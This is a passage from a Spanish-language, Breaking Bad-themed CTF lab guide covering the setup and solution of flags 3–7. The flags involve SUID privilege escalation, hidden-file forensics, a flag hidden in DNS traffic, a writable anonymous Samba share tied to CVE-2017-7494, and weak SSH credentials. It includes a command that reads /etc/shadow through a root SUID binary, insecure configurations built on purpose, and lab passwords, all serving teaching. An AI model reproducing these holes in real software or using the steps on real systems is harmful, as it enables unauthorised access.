<li><p>Compilado como ejecutable:</p></li>
</ul>
<blockquote>
<p>gcc suid_vuln.c -o suid_vuln</p>
<p><img src="cookbook/media/image97.png"
style="width:5.39097in;height:1.08333in" /></p>
</blockquote>
<ol start="3" type="1">
<li><p>Permisos peligrosos asignados:</p>
<ul>
<li><p>Asignado como propiedad de root:</p></li>
</ul></li>
</ol>
<blockquote>
<p>sudo chown root:root suid_vuln</p>
</blockquote>
<ul>
<li><p>Activado permiso SUID:</p></li>
</ul>
<blockquote>
<p>sudo chmod +s suid_vuln</p>
<p><img src="cookbook/media/image98.png"
style="width:5.90556in;height:1.42361in" /></p>
<p><img src="cookbook/media/image99.png"
style="width:5.09234in;height:0.65625in" /></p>
<p><strong>🧪 Probar que funciona</strong></p>
<p>Como el usuario hector, ejecuta el binario:</p>
<p>./suid_vuln</p>
<p>Y en el prompt, introduce algo como:</p>
<p>whoami</p>
<p>Si te devuelve root, entonces… ¡has logrado escalar privilegios!
🚀</p>
<p><img src="cookbook/media/image100.png"
style="width:5.20833in;height:1.61458in" /></p>
<p>Ejecuta ahora:</p>
<p>./suid_vuln</p>
<p>Cuando te pida un comando, prueba algo potente como:</p>
<p><img src="cookbook/media/image101.png"
style="width:5.90694in;height:4.12708in" />cat /etc/shadow</p>
<p><strong>🧪 ¿Qué está pasando técnicamente?</strong></p>
</blockquote>
<ul>
<li><p>Cuando hector ejecuta ./suid_vuln, el sistema le otorga
temporalmente los permisos del propietario del binario, que en este caso
es root.</p></li>
<li><p>El permiso SUID (chmod +s) permite que el binario se ejecute con
los privilegios de su propietario, no de quien lo lanza.</p></li>
<li><p>Por eso, cat /etc/shadow se ejecuta como si lo hiciera root,
aunque estés logueado como hector.</p></li>
</ul>
<ol start="4" type="1">
<li><p>Bandera escondida como archivo solo accesible por root:</p></li>
</ol>
<blockquote>
<p>echo "FLAG3{I_am_the_one_who_knocks}" | sudo tee
/etc/suid-flags/bandera3.txt &gt; /dev/null</p>
<p>chmod 600 /etc/suid-flags/bandera3.txt</p>
</blockquote>
<p><span id="_Toc207189886" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Acceder como usuario chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseña, introduce</p>
<p>Ch0w$up1</p>
<p><img src="cookbook/media/image102.png"
style="width:5.90556in;height:2.17708in" /></p>
<p><strong>2️⃣ Localizar y ejecutar el binario SUID</strong></p>
<p>Nos dirigimos al directorio de hector:</p>
<p>cd /home/hector</p>
<p><img src="cookbook/media/image103.png"
style="width:2.02083in;height:0.77083in" /></p>
<p>El nombre del archivo habla por sí solo…</p>
<p>Ejecutamos suid_vuln</p>
<p>./suid_vuln</p>
<p>Cuando se muestre:</p>
<p>Introduce un comando:</p>
<p><img src="cookbook/media/image104.png"
style="width:2.32292in;height:0.36458in" /></p>
<p>Escribe:</p>
<p>whoami</p>
<p><img src="cookbook/media/image105.png"
style="width:2.98958in;height:0.55208in" /></p>
<p>Buscamos la bandera en el directorio /etc/:</p>
<p><img src="cookbook/media/image106.png"
style="width:5.90556in;height:3.73819in" /></p>
<p>El directorio que buscamos tiene toda la pinta de ser suid-flags.
Pero si pruebas a ir al directorio verás que no puedes:</p>
<p><img src="cookbook/media/image107.png"
style="width:5.90556in;height:2.69931in" /></p>
<p>Tener un binario SUID que te eleva a root no significa que
automáticamente todo lo que hagas fuera de ese binario tenga privilegios
de root.</p>
<p>En nuestro caso:</p>
<ul>
<li><p>Cuando entramos por SSH como chow, nuestra shell sigue teniendo
los permisos de chow.</p></li>
<li><p>Al ejecutar ./suid_vuln, sólo el proceso suid_vuln corre como
root.</p></li>
<li><p>En cuanto sales de ese programa y vuelves a tu shell normal,
pierdes esos privilegios.</p></li>
</ul>
<p>Por eso, ahora que hemos visto que el directorio que nos interesa es
/etc/suid-flags volvemos a ejecutar el binario para poder listar el
contenido:</p>
<p><img src="cookbook/media/image108.png"
style="width:2.95833in;height:1.22917in" /></p>
<p>Dentro de suid-flags encontramos el archivo bandera3.txt</p>
<p><img src="cookbook/media/image109.png"
style="width:4.8125in;height:1.09375in" /></p>
<p>Y por lo explicado anteriormente vamos a necesitar volver a ejecutar
./suid_vuln para leer la bandera:</p>
<p>cat /etc/suid-flags/bandera3.txt</p>
<p><img src="cookbook/media/image110.png"
style="width:3.0625in;height:0.94792in" /></p>
<p>✅ El binario lo ejecutará como root gracias al permiso SUID.</p>
<p><strong>3️⃣ Resultado esperado</strong></p>
<p>FLAG3{I_am_the_one_who_knocks}</p>
<p><span id="_Toc207189887" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El binario vulnerable permite al jugador abusar de system() sin
validación.</p></li>
<li><p>Gracias al SUID, el comando se ejecuta con privilegios de
root.</p></li>
<li><p>El reto enseña los riesgos de compilar binarios sin control y
asignarles permisos inseguros.</p></li>
</ul>
<p><span id="_Toc207189888" class="anchor"></span><strong>📌 Tip
adicional</strong></p>
<p>El jugador puede verificar los permisos del binario con:</p>
<p>ls -l suid_vuln</p>
<p>Verá algo como:</p>
<p>-rwsr-xr-x 1 root root ...</p>
<p>La s en el lugar de ejecución (rws) confirma el flag SUID activo.</p>
<p><span id="_Toc207189889" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 3 atrapada: 'I_am_the_one_who_knocks'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-4-forense-de-archivos-sin-extensión"><strong>🏁 Bandera
4 – Forense de Archivos Sin Extensión</strong></h1>
<p><strong>Categoría:</strong> Forense / File Recovery / Magic Number
Analysis<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> e4d909c290d0fb1ca068ffaddf22cbd0<br />
<strong>Usuario involucrado:</strong> mike<br />
<strong>Contraseña:</strong> <strong>XXXXXXXX</strong><br />
<strong>Carpeta relevante:</strong> /home/mike/Lavanderia</p>
<p><span id="_Toc207189891" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe identificar entre 16 archivos sin extensión cuál
contiene la bandera escondida. El archivo fue preparado para
<strong>ocultar su contenido mediante texto blanco</strong> sobre fondo
blanco en un documento tipo PDF.</p>
<p><span id="_Toc207189892" class="anchor"></span><strong>📦 Contenido
de la carpeta Lavanderia</strong></p>
<p>Archivos sin extensión y sin nombres evidentes. Originalmente estos
tenían formatos como:</p>
<ul>
<li><p>.docx, .xlsx, .eml, .json, .ico, .svg, .xcf, .jpeg, .pdf, .mp3,
.mp4, .iso, .db, .torrent, etc.</p></li>
</ul>
<p>Pero han sido renombrados con una serie numérica y sin extensión,
para obligar al jugador a descubrir su verdadero tipo.</p>
<p><strong>Los archivos originales están formados por:</strong></p>
<ul>
<li><p>Un archivo .db (base de datos SQLite) con una tabla ficticia
llamada pagos, que incluye registros:</p></li>
</ul>
<p>lavanderia_operaciones.db</p>
<p>Puedes abrirlo con herramientas como:</p>
<ul>
<li><p>DB Browser for SQLite (GUI)</p></li>
<li><p>Línea de comandos: sqlite3 lavanderia_operaciones.db</p></li>
<li><p>usar Python, SQLiteStudio, etc.</p></li>
</ul>
<ul>
<li><p>Un archivo .json, que representa un registro de transacciones
ficticias más una sección de "canal de comunicación".</p></li>
<li><p>Un archivo .eml con un mensaje ficticio entre Lydia
Rodarte-Quayle y Mike Ehrmantraut</p></li>
<li><p>Un fichero Excel que representa un libro de cuentas con pagos,
incluyendo a Lydia Rodarte-Quayle</p></li>
<li><p>Un documento tipo contrato que está a nombre de Mike Ehrmantraut,
y hace referencia a una lavandería propiedad de Gustavo Fring,</p></li>
<li><p>Un archivo pdf con la ficha de la chica desaparecida.</p></li>
<li><p>Un mp3 con sintonía intro BB</p></li>
<li><p>Un mp4 de la escena Cocinar es un arte</p></li>
<li><p>Un svg con el logo de los pollos</p></li>
<li><p>Un archivo ico de Heisenberg</p></li>
<li><p>Una imagen jpeg con la foto de la caravana</p></li>
<li><p>Un archivo Torrent de webarchive con los mejores momentos de la
temporada 2</p></li>
<li><p>Una imagen iso de Super Grub2 Disk que pesa 23,7mb</p></li>
<li><p>Y un fichero pdf con la bandera 4 pero escrito en texto de color
blanco:</p></li>
</ul>
<p>Bandera 4: ‘e4d909c290d0fb1ca068ffaddf22cbd0’</p>
<p><img src="cookbook/media/image111.png"
style="width:5.90694in;height:2.70694in" /></p>
<p>Se les ha cambiado el nombre por usa serie numerada:</p>
<p><img src="cookbook/media/image112.png"
style="width:5.90694in;height:3.16667in" /></p>
<p>Y se les ha borrado la extensión:</p>
<p><img src="cookbook/media/image113.png"
style="width:5.90694in;height:3.16042in" /></p>
<p><span id="_Toc207189893" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p>Conexión SSH usando la cuenta de chow</p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseña, introduce</p>
<p>Ch0w$up1</p>
<p>Nos desplazamos has el usuario Mike y vemos que hay una carpeta de
nombre Lavandería con una serie de archivos numerados consecutivos y sin
extensión:</p>
<p><img src="cookbook/media/image114.png"
style="width:5in;height:1.96875in" /></p>
<p><strong>1️⃣ Identificar los tipos de archivo</strong></p>
<p>Desde el terminal, utilizar:</p>
<p>cd /home/mike/Lavanderia</p>
<p>file *</p>
<p>Esto dará información como:</p>
<p>archivo01: ISO 9660 CD-ROM filesystem data ...</p>
<p>archivo02: JPEG image data ...</p>
<p>archivo03: PDF document ...</p>
<p>...</p>
<p><img src="cookbook/media/image115.png"
style="width:5.90556in;height:2.77917in" /></p>
<p>Para análisis más detallado:</p>
<p>binwalk archivo03</p>
<p>trid archivo03</p>
<p>xxd archivo03 | head</p>
<p><strong>2️⃣ Localizar el archivo tipo PDF</strong></p>
<p>Filtrar con:</p>
<p>file * | grep PDF</p>
<p>Esto revelará los archivos de extensión PDF que hay en la carpeta.
Aparecen dos y uno de ellos es el archivo que contiene la bandera.</p>
<p><img src="cookbook/media/image116.png"
style="width:2.96875in;height:0.82292in" /></p>
<p><strong>3️⃣ Abrir el PDF oculto</strong></p>
<p>Como está camuflado con texto blanco, se recomienda abrirlo con un
lector PDF visual (Evince, Okular, PDF Studio) y seleccionar todo el
texto.</p>
<p>Lo que vamos a hacer es enviarnos esos dos ficheros PDF a nuestra
máquina de Kali para analizarlos:</p>
<p>scp <a
href="mailto:chow@192.168.1.44:/home/mike/Lavanderia/002">chow@192.168.1.44:/home/mike/Lavanderia/002</a>
.</p>
<p>scp <a
href="mailto:chow@192.168.1.44:/home/mike/Lavanderia/007">chow@192.168.1.44:/home/mike/Lavanderia/007</a>
.</p>
<p><img src="cookbook/media/image117.png"
style="width:5.90556in;height:1.92708in" /></p>
<p>Analizamos el contenido de los archivos:</p>
<p>El archivo 007 contiene una ficha de la chica desaparecida y el 002
parece en blanco:</p>
<p><img src="cookbook/media/image118.png"
style="width:3.01556in;height:3.15137in" /> <img
src="cookbook/media/image119.png"
style="width:2.74612in;height:3.13374in" /></p>
<p>Pero al seleccionar con el ratón el posible contenido del fichero
aparece la bandera:</p>
<p><img src="cookbook/media/image120.png"
style="width:5.90556in;height:1.75in" /></p>
<p><strong>4️⃣ Resultado esperado</strong></p>
<p>FLAG4{e4d909c290d0fb1ca068ffaddf22cbd0}</p>
<p><span id="_Toc207189894" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Se explora la técnica de <strong>encubrimiento visual</strong>
(white-on-white text).</p></li>
<li><p>Introduce al jugador en herramientas de análisis de archivo por
“firma mágica” o <strong>magic number</strong>.</p></li>
<li><p>Refuerza habilidades en <strong>reconstrucción de
extensión</strong> sin depender de nombres.</p></li>
</ul>
<p><span id="_Toc207189895" class="anchor"></span><strong>🧰
Herramientas clave recomendadas</strong></p>
<table>
<colgroup>
<col style="width: 37%" />
<col style="width: 62%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Herramienta</strong></th>
<th style="text-align: center;"><strong>Propósito</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>file</td>
<td>Identificar tipo de archivo</td>
</tr>
<tr>
<td>binwalk</td>
<td>Detectar encabezado embebido</td>
</tr>
<tr>
<td>trid</td>
<td>Clasificar por firma binaria</td>
</tr>
<tr>
<td>strings</td>
<td>Buscar flag como texto plano</td>
</tr>
<tr>
<td>pdftotext</td>
<td>Extraer contenido visible del PDF</td>
</tr>
<tr>
<td>xxd / hexedit</td>
<td>Ver el encabezado en hexadecimal</td>
</tr>
</tbody>
</table>
<p><span id="_Toc207189896" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 4 atrapada:
'e4d909c290d0fb1ca068ffaddf22cbd0'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-5-dns-malicioso-en-tráfico-.pcap"><strong>🏁 Bandera 5 –
DNS Malicioso en Tráfico .pcap</strong></h1>
<p><strong>Categoría:</strong> Red / Forense / OSINT<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> Yo_soy_el_peligro<br />
<strong>Usuario involucrado:</strong> lydia<br />
<strong>Contraseña:</strong> <strong>XXXXXXXX</strong><br />
<strong>Archivo clave:</strong> DeNadieSospeches.pcap<br />
📁 Ruta esperada: /home/lydia/DeNadieSospeches.pcap</p>
<p><span id="_Toc207189898" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe analizar un archivo .pcap que contiene consultas DNS,
una de las cuales está manipulada para esconder la bandera en el nombre
de dominio solicitado. Solo realizando un análisis profundo podrá
encontrar la bandera camuflada.</p>
<p><span id="_Toc207189899" class="anchor"></span><strong>🔧 Entorno
técnico simulado</strong></p>
<p>Esta captura se ha generado usando <strong>Scapy</strong>, con ruido
DNS incluido para dificultar la localización:</p>
<p>bandera = "Bandera5:Yo_soy_el_peligro"</p>
<p>dominio = f"{bandera}.lospolloshermanos.local"</p>
<p>Esto queda embebido como una solicitud DNS en un paquete legítimo,
junto a muchas consultas comunes como google.com, ftp.internal,
breakingbad.tv, etc.</p>
<p><span id="_Toc207189900" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Conexión SSH usando la cuenta de chow</strong></p>
<p>Ejecuta el cliente SSH:</p>
<blockquote>
<p>ssh chow@192.168.1.44</p>
</blockquote>
<p>Cuando te pida la contraseña, introduce</p>
<blockquote>
<p>Ch0w$up1</p>
</blockquote>
<p><img src="cookbook/media/image121.png"
style="width:5.90556in;height:3.01528in" /></p>
<p>Nos desplazamos al directorio de lydia y verificamos la presencia de
dos archivos. En este reto nos vamos a centrar en el archivo pcap:</p>
<p>ls -l</p>
<p><img src="cookbook/media/image122.png"
style="width:3.625in;height:0.76042in" /></p>
<p>DeNadieSospeches.pcap nos hace sospechar que lo que debemos buscar
dentro es DNS</p>
<p><strong>2️⃣ Abrir el archivo con Wireshark</strong></p>
<p>Lo que vamos a hacer es enviarnos ese archivo pcap a nuestra máquina
de Kali para analizarlo:</p>
<p>scp <a
href="mailto:chow@192.168.1.44:/home/lydia/DeNadieSospeches.pcap">chow@192.168.1.44:/home/lydia/DeNadieSospeches.pcap</a>
.</p>
<p><img src="cookbook/media/image123.png"
style="width:5.90556in;height:1.0375in" /></p>
<p>Usar Wireshark para explorar las consultas DNS:</p>
<p>dns.qry.name contains "Bandera"</p>
<p>O simplemente:</p>
<p>Dns</p>
<p><img src="cookbook/media/image124.png"
style="width:5.90556in;height:1.24028in" /></p>
<p>Haz clic derecho sobre el paquete que incluya la consulta sospechosa
y selecciona:</p>
<p>Follow → UDP Stream</p>
<p><strong>3️⃣ Confirmar la bandera oculta</strong></p>
<p>Dentro de los datos del paquete se visualizará:</p>
<p>Bandera5:Yo_soy_el_peligro.lospolloshermanos.local</p>
<p>✅ El jugador debe extraer la parte entre Bandera5: y el
.lospollos..., que es: Yo_soy_el_peligro</p>
<p><img src="cookbook/media/image125.png"
style="width:4.95135in;height:2.67708in" /></p>
<p><strong>4️⃣ Alternativas desde terminal (CLI)</strong></p>
<p>Si Wireshark no está disponible, puedes usar tshark:</p>
<p>tshark -r DeNadieSospeches.pcap -Y 'dns.qry.name contains "Bandera"'
-T fields -e dns.qry.name</p>
<p><img src="cookbook/media/image126.png"
style="width:5.90556in;height:0.71042in" /></p>
<p>Esto devolverá directamente el dominio que contiene la bandera.</p>
<p><span id="_Toc207189901" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Se explota el hecho de que los dominios pueden contener texto
arbitrario.</p></li>
<li><p>Introduce al jugador a técnicas de <strong>camuflaje semántico en
protocolos abiertos</strong>.</p></li>
<li><p>Resalta cómo se puede usar tráfico DNS legítimo para transferir
información encubierta sin levantar alertas evidentes.</p></li>
</ul>
<p><span id="_Toc207189902" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 5 atrapada: 'Yo_soy_el_peligro'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="bandera-6-explotación-de-samba-cve-2017-7494"><strong>🏁 Bandera
6 – Explotación de Samba (CVE-2017-7494)</strong></h1>
<p><strong>Categoría:</strong> Pwn / Red / Explotación Activa<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Flag:</strong> Usted_es_un_maldito_artista<br />
<strong>Usuario involucrado:</strong> tyrus<br />
📁 Carpeta compartida: /home/tyrus/<br />
🔧 Recurso Samba: [anonymous]</p>
<p><span id="_Toc207189904" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe conectarse al recurso compartido
<strong>Samba</strong> expuesto por el sistema y simular la explotación
de la <strong>vulnerabilidad RCE (Remote Code Execution)</strong>
conocida como <strong>CVE-2017-7494</strong>, que afecta a versiones de
Samba anteriores a 4.6.4.</p>
<p><span id="_Toc207189905" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<p>Ya está configurado el servidor Samba vulnerable sobre <strong>Ubuntu
Server 14.04.6</strong>:</p>
<ol type="1">
<li><p><strong>Versión vulnerable de Samba instalada:</strong></p></li>
</ol>
<blockquote>
<p>sudo apt-get install samba</p>
<p>samba -V</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Configuración del recurso compartido</strong> en
/etc/samba/smb.conf:</p></li>
</ol>
<blockquote>
<p>[anonymous]</p>
<p>path = /home/tyrus</p>
<p>browsable = yes</p>
<p>writable = yes</p>
<p>guest ok = yes</p>
<p>guest only = yes</p>
<p>read only = no</p>
<p>force user = tyrus</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>Usuario y carpeta creada:</strong></p></li>
</ol>
<blockquote>
<p>sudo useradd -m tyrus</p>
<p>sudo chown tyrus:tyrus /home/tyrus</p>
</blockquote>
<p><strong>Dar de alta el usuario en Samba</strong> (aunque no requiera
login real):</p>
<p>sudo smbpasswd -a tyrus</p>
<p>Puedes dejar el password en blanco.</p>
<p>sudo chmod 775 /home/tyrus</p>
<p>⚠️ No le hemos asignado contraseña al usuario tyrus en ninguno de los
pasos.</p>
<p>Eso significa que:</p>
<p>🔓 El usuario existe en el sistema, pero no puede iniciar sesión
directamente (por ejemplo, vía ssh o consola) porque no tiene clave
definida.</p>
<p>🛠️ Samba lo usará igualmente gracias a force user = tyrus, ya que ese
parámetro obliga a tratar todo acceso al recurso compartido como si
fuera el usuario tyrus, sin requerir autenticación.</p>
<ol start="4" type="1">
<li><p><strong>Servicio reiniciado</strong>:</p></li>
</ol>
<blockquote>
<p>sudo service smbd restart</p>
</blockquote>
<ol start="5" type="1">
<li><p><strong>Bandera colocada en</strong>
/var/lib/samba-flags/bandera6.txt:</p></li>
</ol>
<blockquote>
<p>echo "Bandera 6:’Usted_es_un_maldito_artista’" | sudo tee
/var/lib/samba-flags/bandera6.txt &gt; /dev/null</p>
</blockquote>
<ol start="6" type="1">
<li><p><strong>Script desplegado:</strong></p></li>
</ol>
<p>Creamos un script en /usr/local/bin/samba_watch.sh:</p>
<p><strong>samba_watch.sh</strong></p>
<p>#!/bin/bash</p>
<p>WATCH_DIR="/home/tyrus"</p>
<p>FLAG_SRC="/var/lib/samba-flags/bandera6.txt"</p>
<p>FLAG_DST="$WATCH_DIR/bandera6.txt"</p>
<p>if [ ! -f "$FLAG_SRC" ]; then</p>
<p>echo "[ERROR] No se encuentra la bandera en $FLAG_SRC"</p>
<p>exit 1</p>
<p>fi</p>
<p>echo "[+] Watcher iniciado: vigilando $WATCH_DIR ..."</p>
<p>while true; do</p>
<p>for file in "$WATCH_DIR"/*; do</p>
<p>if [ -f "$file" ]; then</p>
<p>echo "[DEBUG] Detectado archivo: $file"</p>
<p>if [ ! -f "$FLAG_DST" ]; then</p>
<p>echo "[+] Copiando bandera..."</p>
<p>cp "$FLAG_SRC" "$FLAG_DST"</p>
<p>chown tyrus:tyrus "$FLAG_DST"</p>
<p>chmod 644 "$FLAG_DST"</p>
<p>echo "[+] Bandera copiada en $FLAG_DST"</p>
<p>fi</p>
<p>fi</p>
<p>done</p>
<p>sleep 2</p>
<p>done</p>
<ol start="7" type="1">
<li><p><strong>Lo hacemos ejecutable:</strong></p></li>
</ol>
<blockquote>
<p>sudo chmod +x /usr/local/bin/samba_watch.sh</p>
</blockquote>
<ol start="8" type="1">
<li><p>Lo lanzamos en background desde el script de instalación del
reto:</p></li>
</ol>
<p>nohup /usr/local/bin/samba_watch.sh &gt;/dev/null 2&gt;&amp;1
&amp;</p>
<ol start="9" type="1">
<li><p>Esto ya queda corriendo como proceso independiente. Cuando
alguien suba un archivo al recurso Samba, la bandera aparecerá en
/home/tyrus.</p></li>
<li><p><strong>Detalles</strong>:</p></li>
</ol>
<ul>
<li><p>nohup → evita que el proceso muera cuando cierres la
sesión.</p></li>
<li><p>&gt;/dev/null 2&gt;&amp;1 → manda toda la salida estándar y de
error a la nada (silencio total).</p></li>
<li><p>&amp; → lo deja corriendo en segundo plano.</p></li>
</ul>
<p><img src="cookbook/media/image127.png"
style="width:5.90556in;height:0.63542in" /></p>
<ul>
<li><p>El [1] significa que es el <strong>primer proceso en segundo
plano</strong> que tu shell ha lanzado en esta sesión.</p></li>
<li><p>El 1554 es el <strong>PID (Process ID)</strong> asignado al
script samba_watch.sh.</p></li>
<li></li>
</ul>
<p>Es decir: ahora mismo el watcher está ejecutándose en background,
escuchando cambios en /home/tyrus.</p>
<p><img src="cookbook/media/image128.png"
style="width:5.90556in;height:1.09375in" /></p>
<p>✅ Esto significa que el <strong>script está activo y debería
detectar archivos nuevos</strong> en /home/tyrus.</p>
<ol start="11" type="1">
<li><p><strong>Persistencia en el scrip:</strong></p></li>
</ol>
<p>El script (/usr/local/bin/samba_watch.sh) no se arranca solo “por
arte de magia” al encender el sistema… a menos que alguien lo haya
configurado como servicio de arranque (systemd, init.d o similar).</p>
<p>Si ahora mismo lo ejecutamos nosotros a mano, al reiniciar dejará de
estar en memoria y no vigilará nada hasta que lo lancemos otra vez.</p>
<p>Si quieres que esté siempre activo, puedes crear un servicio systemd
para que se levante en cada arranque.</p>
<p>En Ubuntu Server 14.04 no tienes systemctl de serie, porque esa
versión usa Upstart como sistema init, no systemd2.</p>
<p>Esto implica que:</p>
<p>Los comandos systemctl start/stop/enable no funcionarán a menos que
instales y configures systemd manualmente (lo cual no suele ser
recomendable en 14.04).</p>
<p>Para arrancar servicios automáticamente en cada inicio, en 14.04 se
usan scripts en /etc/init/ (formato Upstart) o el comando update-rc.d
para servicios tipo SysV. Lo haremos de la misma forma que con el reto
de nc, modificando el archivo rc.local:</p>
<p><img src="cookbook/media/image129.png"
style="width:5.90556in;height:2.32083in" /></p>
<p>Y después recuerda:</p>
<p>sudo chmod +x /etc/rc.local</p>
<p>sudo chmod +x /usr/local/bin/samba_watch.sh</p>
<p><img src="cookbook/media/image130.png"
style="width:5.70833in;height:0.66667in" /></p>
<p>para que ambos sean ejecutables al arranque.</p>
<p><span id="_Toc207189906" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Descubrir el recurso compartido</strong></p>
<p>Usar herramientas como smbclient o enum4linux:</p>
<p>smbclient -L //192.168.1.44/ -N</p>
<p><img src="cookbook/media/image131.png"
style="width:5.90556in;height:2.21875in" /></p>
<p>Esto listará el recurso [anonymous].</p>
<p><strong>2️⃣ Conectarse como invitado</strong></p>
<p>smbclient //192.168.1.44/anonymous -N</p>
<p><img src="cookbook/media/image132.png"
style="width:4.39583in;height:0.97917in" /></p>
<p>Esto te permitiría subir archivos al directorio /home/tyrus.</p>
<p><strong>3️⃣ Simular la explotación (sin ejecución real)</strong></p>
<p>Dado que el entorno es simulado, no se sube un .so malicioso como en
la CVE original. Pero puedes probar el acceso y la capacidad de
escritura, demostrando que la configuración permitiría explotación si el
servicio fuera interpretado por dlopen().</p>
<p>En un entorno real, el exploit consistiría en:</p>
<ul>
<li><p>Subir un archivo .so con una función tipo init_module</p></li>
<li><p>Ejecutar la librería como si fuera un módulo</p></li>
<li><p>Obtener ejecución remota</p></li>
</ul>
<p>Podemos probar la funcionalidad subiendo cualquier archivo. Subimos
por ejemplo un archivo de texto llamado prueba.txt:</p>
<p>put prueba.txt</p>
<p><img src="cookbook/media/image133.png"
style="width:5.90556in;height:1.82292in" /></p>
<p>El watcher detecta la creación de prueba.txt y copia la bandera desde
/var/lib/samba-flags/bandera6.txt a /home/tyrus/bandera6.txt.</p>
<p><strong>4️⃣ Verificación de bandera</strong></p>
<p>Una vez que el jugador ha demostrado conocimiento y habilidad para
interactuar con el recurso, puede descargar la bandera desde
sistema:</p>
<p>get bandera6.txt</p>
<p><img src="cookbook/media/image134.png"
style="width:5.90556in;height:0.61458in" /></p>
<p><img src="cookbook/media/image135.png"
style="width:5.90556in;height:4.23889in" /></p>
<p><span id="_Toc207189907" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>La bandera demuestra comprensión de una explotación real de
Samba.</p></li>
<li><p>Enseña cómo una configuración aparentemente simple puede abrir la
puerta a RCE.</p></li>
<li><p>Refuerza prácticas de análisis y enumeración de recursos SMB en
entornos CTF y pentest.</p></li>
</ul>
<p><span id="_Toc207189908" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 6 atrapada: 'Usted_es_un_maldito_artista'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-7-fuerza-bruta-sobre-credenciales-ssh-débiles"><strong>🏁
Bandera 7 – Fuerza Bruta sobre Credenciales SSH Débiles</strong></h1>
<p><strong>Categoría:</strong> Pwn / Red / Credenciales<br />
<strong>Nivel:</strong> Básico - Medio<br />
<strong>Flag:</strong> Mejor_llama_a_Saul<br />
<strong>Usuario objetivo:</strong> saul<br />
<strong>Contraseña insegura:</strong> <strong>XXXXXX</strong><br />
<strong>Archivo clave:</strong> /home/saul/bandera7.txt</p>
<p><span id="_Toc207189910" class="anchor"></span><strong>🎯 Objetivo
del reto</strong></p>
<p>El jugador debe identificar un servicio SSH activo y usar fuerza
bruta o diccionario básico para adivinar la contraseña débil del usuario
saul. Tras el acceso, deberá buscar una bandera en su directorio
personal.</p>
<p><span id="_Toc207189911" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<p>Una vulnerabilidad de SSH es un fallo en el protocolo, la
implementación o la configuración del servicio SSH (Secure Shell) que un
atacante puede explotar para obtener acceso no autorizado a un sistema.
A diferencia de la vulnerabilidad de Samba, que es un fallo de software
específico, las vulnerabilidades de SSH en un CTF suelen centrarse en la
configuración.</p>
<p><strong>¿Cómo funciona una vulnerabilidad de SSH?</strong></p>
<p>Las vulnerabilidades de SSH que son comunes en un entorno CTF no
suelen ser fallos de código complejos, sino más bien malas
configuraciones o malas prácticas de seguridad. Estas son las más
comunes:</p>
<p>Credenciales débiles (ataque de fuerza bruta): Si el servidor SSH
permite la autenticación con contraseña y un usuario tiene una
contraseña muy sencilla, un atacante puede usar un diccionario o un
ataque de fuerza bruta para adivinarla. Esta es la forma más básica y
común de explotar un servidor SSH en un CTF.</p>
<p>Permitir el inicio de sesión como root: Por defecto, la mayoría de
las configuraciones de SSH modernas no permiten que el usuario root
inicie sesión directamente. Esto se hace por seguridad.</p>
<p>Si un servidor permite que root inicie sesión, y un atacante adivina
la contraseña de root (o si la contraseña es débil), obtendrá control
total sobre la máquina en un solo paso.</p>
<p>Claves SSH débiles o comprometidas: A veces, un reto puede implicar
que el atacante encuentre una clave privada SSH que se dejó en un lugar
inseguro (por ejemplo, en un recurso compartido de red o en un
directorio web accesible). Si el servidor SSH confía en esa clave
pública para el inicio de sesión, el atacante puede usar la clave
privada para acceder al sistema.</p>
<p>Permisos incorrectos: Una configuración incorrecta en los permisos de
los archivos de configuración de SSH (~/.ssh/authorized_keys o
/etc/ssh/sshd_config) puede permitir que un usuario de bajo privilegio
los modifique para permitir el inicio de sesión de un atacante.</p>
<p><strong>La máquina está preparada de la siguiente
manera:</strong></p>
<ol type="1">
<li><p><strong>Se ha instalado el servidor SSH:</strong></p></li>
</ol>
<blockquote>
<p>sudo apt-get install openssh-server</p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>El usuario vulnerable saul fue creado:</strong></p></li>
</ol>
<blockquote>
<p>sudo useradd -m -s /bin/bash saul</p>
<p>echo "saul:<strong>XXXXXX</strong>" | sudo chpasswd</p>
</blockquote>
<ol start="3" type="1">
<li><p><strong>El archivo de configuración del servicio permite
autenticación por contraseña:</strong></p></li>
</ol>
<blockquote>
<p>PasswordAuthentication yes</p>
<p>PermitRootLogin no</p>
</blockquote>
<ol start="4" type="1">
<li><p><strong>Bandera colocada en su directorio:</strong></p></li>
</ol>
<blockquote>
